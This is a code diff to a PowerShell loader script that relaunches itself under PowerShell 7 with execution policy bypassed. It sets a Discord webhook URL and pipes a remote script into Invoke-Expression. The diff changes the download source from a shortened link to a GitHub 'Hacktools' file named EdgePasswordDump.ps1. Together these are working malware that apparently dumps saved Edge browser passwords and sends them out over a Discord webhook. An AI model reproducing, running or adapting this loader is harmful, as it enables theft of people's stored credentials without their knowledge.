@@ -13,7 +13,6 @@ if ($PSVersionTable.PSVersion.Major -lt 7) {
     if ($pwshCmd) {
         $pwshPath = $pwshCmd.Source
         Write-Host "Restarting script in PowerShell 7 ($pwshPath)..."
-
         if ($PSCommandPath) {
             # Running from a script file, restart with -File
             & $pwshPath -NoProfile -ExecutionPolicy Bypass -File $PSCommandPath @args
@@ -23,12 +22,11 @@ if ($PSVersionTable.PSVersion.Major -lt 7) {
             $inlineScript = @"
 `$env:DISCORD_WEBHOOK_URL = '$webhookUrl'
 `$db = ''
-irm https://tinyurl.com/y9ezd7ay | iex
+irm https://raw.githubusercontent.com/BlueJuice1/Hacktools/refs/heads/main/EdgePasswordDump/EdgePasswordDump.ps1 | iex
 "@
 
             & $pwshPath -NoProfile -ExecutionPolicy Bypass -NoExit -Command $inlineScript
         }
-
         exit
     }
     else {
